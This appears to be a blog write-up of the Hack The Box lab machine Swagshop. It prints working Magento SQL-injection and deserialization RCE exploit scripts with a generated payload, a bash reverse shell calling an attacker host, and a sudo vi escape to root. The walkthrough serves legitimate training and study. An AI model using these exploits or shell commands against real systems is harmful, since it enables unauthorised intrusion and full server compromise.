---
layout: single
title: Swagshop - Hack The Box
excerpt: "Swagshop is a easy difficulty linux machine which running old version on Magento. It is vulnerable to SQLi and RCE which leads to shell as www-data. Privilege escalation invovles the www-data can use vim in the context of root which is abused to execute commands as root."
date: 2020-04-10
classes: wide
header:
  teaser: /assets/images/htb-writeup-swagshop/swagshop_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - OSCP
  - GTFOBins
  - RCE
  - CMS
---

![](/assets/images/htb-writeup-swagshop/swagshop_logo.png)

## Synopsis
Swagshop is a easy difficulty linux machine which running old version on Magento. It is vulnerable to SQLi and RCE which leads to shell as www-data. Privilege escalation invovles the www-data can use vim in the context of root which is abused to execute commands as root.
## Skills Required
* Enumeration

## Skills Learned
* Exploit Modificaion
* GTFOBins

 
---
## Enumeration
### Nmap
```java
# Nmap 7.60 scan initiated Tue Apr  7 22:21:49 2020 as: nmap -Pn -sC -sV -v -p22,80 -oN full.nmap swagshop.htb
Nmap scan report for swagshop.htb (10.10.10.140)
Host is up (0.31s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 88733EE53676A47FC354A61C32516E82
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://10.10.10.140/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Looking at the nmap we've `SSH` and `Apache` running on their default ports.

## Apache
Browsing to the `HTTP` page we see that the server running `Magento CMS`.
![](/assets/images/htb-writeup-swagshop/http.png)

Like all other `CMS` we have tool called [Magescan](https://github.com/steverobbins/magescan) to scan `Magento`. we can download its latest release and scan using it.
```
php magescan.phar scan:all 10.10.10.140
```

Scan reveals the `Magento` version that being used on the server.
```
+-----------+------------------+                                                                                                
| Parameter | Value            |                                                            
+-----------+------------------+                                       
| Edition   | Community        |                                        
| Version   | 1.9.0.0, 1.9.0.1 |                                 
+-----------+------------------+
```

It also found `local.xml` file in `/app/etc/` folder . Let's have a look at that file.
```
| app/etc/local.xml                            | 200           | Fail   |
```

we find the information in it which seems to be sensitive like database credentials and installation key. we'll keep a note of this.

![](/assets/images/htb-writeup-swagshop/local.png)


After googling about the `Magento 1.9.0.0`. I came across the list of [CVEs](https://www.cvedetails.com/vulnerability-list/vendor_id-15393/product_id-31613/Magento-Magento.html) from it we found a `arbitary SQL command execution` vulnerability i.e [CVE-2015-1397](https://www.cvedetails.com/cve/CVE-2015-1397/). The vulnerability named `Magento Shoplift` which we can find at [exploit-db](https://www.exploit-db.com/exploits/37977).

## SQL Injection
Looking at the script we see it uses prepared statements to insert values in the `admin` table.
```sql
q="""
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
"""
```

It then injects it into the `popularity` parameter.
```python
query = q.replace("\n", "").format(username="forme", password="forme")
pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)
```

We need to modifiy the script a bit to make it work for us. we've to add our `target`.
```python
target = "http://10.10.10.140/index.php"
```

Running the script it creates us credential `forme:forme` which we can use on `admin` page to login.
```
python shoplift.py 

WORKED
Check http://10.10.10.140/index.php/admin with creds forme:forme
```

It created the credentials for us `forme:forme` we can try them at `http://10.10.10.140/index.php/admin`.

![](/assets/images/htb-writeup-swagshop/magento.png)

We're able to successfully login to `Magento` admin panel with those creds.

![](/assets/images/htb-writeup-swagshop/admin.png)

## Foothold
Previously `searchsploit` also reavealed us [Authenticated RCE](https://www.exploit-db.com/exploits/37811) during searching for the `Magento` exploits. LNow, as w already have the credentials we can try using it. But, the exploit doesn't work out of the box and it needs some changes.

First we need to change the installation date mentioned by the author and provide it with our credentials.
```python
# Config.
username = ''
password = ''
php_function = 'system'  # Note: we can only pass 1 argument to the function
install_date = 'Sat, 15 Nov 2014 20:27:57 +0000'  # This needs to be the exact date from /app/etc/local.xml
```

This can be found in the `local.xml` which we found earlier.

![](/assets/images/htb-writeup-swagshop/local.png)

Now, Let's look at what the script does. It first creates a `mechanize`(Stateful programmatic web browsing in Python. Browse pages programmatically with easy HTML form filling and clicking of links) browser object and then logs the user in
```python
#Setup the mechanize browser and options
br = mechanize.Browser()
br.set_proxies({"http": "localhost:8080"})
br.set_handle_robots(False)

request = br.open(target)

br.select_form(nr=0)
br.form.new_control('text', 'login[username]', {'value': username})  # Had to manually add username control.
br.form.fixup()
br['login[username]'] = username
br['login[password]'] = password
```

we can set the `proxy` inside script and `intercept` the request made by script.
```
python rce.py http://10.10.10.140/index.php/admin "whoami"
```
![](/assets/images/htb-writeup-swagshop/burp1.png)

It then finds the `ajaxBlockUrl` and `FORM_KEY` values.
```python
url = re.search("ajaxBlockUrl = \'(.*)\'", content)
url = url.group(1)
key = re.search("var FORM_KEY = '(.*)'", content)
key = key.group(1)
```

Searching at the source of the dashboard page we see those variables.

![](/assets/images/htb-writeup-swagshop/block.png)

![](/assets/images/htb-writeup-swagshop/formkey.png)

After finding them it creates a URL by concatenating them.
```python
request = br.open(url + 'block/tab_orders/period/7d/?isAjax=true', data='isAjax=false&form_key=' + key)
tunnel = re.search("src=\"(.*)\?ga=", request.read())
tunnel = tunnel.group(1)
```

In this case the URL looks like this :
```
http://10.10.10.140/index.php/admin/dashboard/ajaxBlock/key/961d2a1f2c0dd3c21cc5be05d5e2a994/block/tab_orders/period/7d/?isAjax=true
```
And the post data:
```
isAjax=false&form_key=sBSfte9VQAfTxWvm
```

Requesting the page and looking at its response we don't see any data.

![](/assets/images/htb-writeup-swagshop/nodata.png)

Let's change the time period to say 2years in the URL, we'll substitute `7d` with `2y`.
```
http://10.10.10.140/index.php/admin/dashboard/ajaxBlock/key/961d2a1f2c0dd3c21cc5be05d5e2a994/block/tab_orders/period/2y/?isAjax=true
```

Requesting the page again we see that the response contains the `tunnel` link which the exploit is searching for.

![](/assets/images/htb-writeup-swagshop/data.png)

```python
tunnel = re.search("src=\"(.*)\?ga=", request.read())
tunnel = tunnel.group(1)
```

Now for the next step the exploit creates the payload using serialized objects. Copy the payload generation part from the script
```python
import base64 
from hashlib import md5
php_function = 'system'

install_date = 'Wed, 08 May 2019 07:23:09 +0000'

arg = 'whoami'

# POP chain to pivot into call_user_exec
payload = 'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writer_Mail\":4:{s:16:' \
          '\"\00*\00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";i:1;s:12:\"EXTERMINATE!\";i:2;s:15:\"' \
          'EXTERMINATE!!!!\";}s:22:\"\00*\00_subjectPrependText\";N;s:10:\"\00*\00_layout\";O:23:\"'     \
          'Zend_Config_Writer_Yaml\":3:{s:15:\"\00*\00_yamlEncoder\";s:%d:\"%s\";s:17:\"\00*\00'     \
          '_loadedSection\";N;s:10:\"\00*\00_config\";O:13:\"Varien_Object\":1:{s:8:\"\00*\00_data\"' \
          ';s:%d:\"%s\";}}s:8:\"\00*\00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}' % (len(php_function), php_function,
                                                                                     len(arg), arg)

payload = base64.b64encode(payload)
gh = md5(payload + install_date).hexdigest()

print "payload: " + payload
print "gh: " + gh
```

Running it will generate the payload to execute `whoami`.
```
python payload.py 

payload:Tzo4OiJaZW5kX0xvZyI6MTp7czoxMToiACoAX3dyaXRlcnMiO2E6Mjp7aTowO086MjA6IlplbmRfTG9nX1dyaXRlcl9NYWlsIjo0OntzOjE2OiIAKgBfZXZlbnRzVG9NYWlsIjthOjM6e2k6MDtzOjExOiJFWFRFUk1JTkFURSI7aToxO3M6MTI6IkVYVEVSTUlOQVRFISI7aToyO3M6MTU6IkVYVEVSTUlOQVRFISEhISI7fXM6MjI6IgAqAF9zdWJqZWN0UHJlcGVuZFRleHQiO047czoxMDoiACoAX2xheW91dCI7TzoyMzoiWmVuZF9Db25maWdfV3JpdGVyX1lhbWwiOjM6e3M6MTU6IgAqAF95YW1sRW5jb2RlciI7czo2OiJzeXN0ZW0iO3M6MTc6IgAqAF9sb2FkZWRTZWN0aW9uIjtOO3M6MTA6IgAqAF9jb25maWciO086MTM6IlZhcmllbl9PYmplY3QiOjE6e3M6ODoiACoAX2RhdGEiO3M6Njoid2hvYW1pIjt9fXM6ODoiACoAX21haWwiO086OToiWmVuZF9NYWlsIjowOnt9fWk6MTtpOjI7fX0=
gh: ac45fbaa8e4537ac82f346ea37f7ce86
```
Now copy the payload and the gh value to request the `tunnel` URL, and sending a request results in code execution.

![](/assets/images/htb-writeup-swagshop/burp2.png)

The modified original python script looks like this.
```python
#!/usr/bin/python
from hashlib import md5
import sys
import re
import base64
import mechanize

def usage():
    print "Usage: python %s <target> <argument>\nExample: python %s http://localhost \"uname -a\""
    sys.exit()


if len(sys.argv) != 3:
    usage()

# Command-line args
target = sys.argv[1]
arg = sys.argv[2]

# Config.
username = 'forme'
password = 'forme'
php_function = 'system'  # Note: we can only pass 1 argument to the function
install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml

# POP chain to pivot into call_user_exec
payload = 'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writer_Mail\":4:{s:16:' \
          '\"\00*\00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";i:1;s:12:\"EXTERMINATE!\";i:2;s:15:\"' \
          'EXTERMINATE!!!!\";}s:22:\"\00*\00_subjectPrependText\";N;s:10:\"\00*\00_layout\";O:23:\"'     \
          'Zend_Config_Writer_Yaml\":3:{s:15:\"\00*\00_yamlEncoder\";s:%d:\"%s\";s:17:\"\00*\00'     \
          '_loadedSection\";N;s:10:\"\00*\00_config\";O:13:\"Varien_Object\":1:{s:8:\"\00*\00_data\"' \
          ';s:%d:\"%s\";}}s:8:\"\00*\00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}' % (len(php_function), php_function,
                                                                                     len(arg), arg)
# Setup the mechanize browser and options
br = mechanize.Browser()
br.set_proxies({"http": "localhost:8080"})
br.set_handle_robots(False)

request = br.open(target)

br.select_form(nr=0)
#br.form.new_control('text', 'login[username]', {'value': username})  # Had to manually add username control.
br.form.fixup()
br['login[username]'] = username
br['login[password]'] = password

br.method = "POST"
request = br.submit()
content = request.read()

url = re.search("ajaxBlockUrl = \'(.*)\'", content)
url = url.group(1)
key = re.search("var FORM_KEY = '(.*)'", content)
key = key.group(1)

request = br.open(url + 'block/tab_orders/period/2y/?isAjax=true', data='isAjax=false&form_key=' + key)
tunnel = re.search("src=\"(.*)\?ga=", request.read())
tunnel = tunnel.group(1)

payload = base64.b64encode(payload)
gh = md5(payload + install_date).hexdigest()

exploit = tunnel + '?ga=' + payload + '&h=' + gh

try:
    request = br.open(exploit)
except (mechanize.HTTPError, mechanize.URLError) as e:
    print e.read()
```
Running the script:
```
python rce.py http://10.10.10.140/index.php/admin whoami

www-data
```
Now, we can execute a reverse shell using bash `bash -i >& /dev/tcp/10.10.14.24/9001 0>&1'`.
```
python rce.py http://10.10.10.140/index.php/admin "bash -c 'bash -i >& /dev/tcp/10.10.14.24/9001 0>&1'"
```
And we get back a reverse shell as `www-data`.
```
ncat -lvnp 9001

Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.140.
Ncat: Connection from 10.10.10.140:51254.

www-data@swagshop:/var/www/html$ whoami && id

www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Privilege Escalation
Doing little enumeration and looking at the `sudo` permission of `www-data`. we can see that `www-data` can run vim as root without password.
```
www-data@swagshop:/var/www/html$ sudo -l

Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```
`GTFOBins` is the good source for exploiting this kinda system binaries. looking at [vi](https://gtfobins.github.io/gtfobins/vi/#shell) we can use the following  to get as `root` shell
```bash
sudo /usr/bin/vi /var/www/html/index.php -c ':!/bin/sh' /dev/null
```
Executing it we get we're presented with `root` shell.
```
root@swagshop:~# whoami && id
root
uid=0(root) gid=0(root) groups=0(root)
root@swagshop:~# cat root.txt
c2b087d66e14a652a3b86a130ac56721

   ___ ___
 /| |/|\| |\
/_| ´ |.` |_\           We are open! (Almost)
  |   |.  |
  |   |.  |         Join the beta HTB Swag Store!
  |___|.__|       https://hackthebox.store/password

                   PS: Use root flag as password!
root@swagshop:~# 
```
Thank you for taking your time for reading this blog!.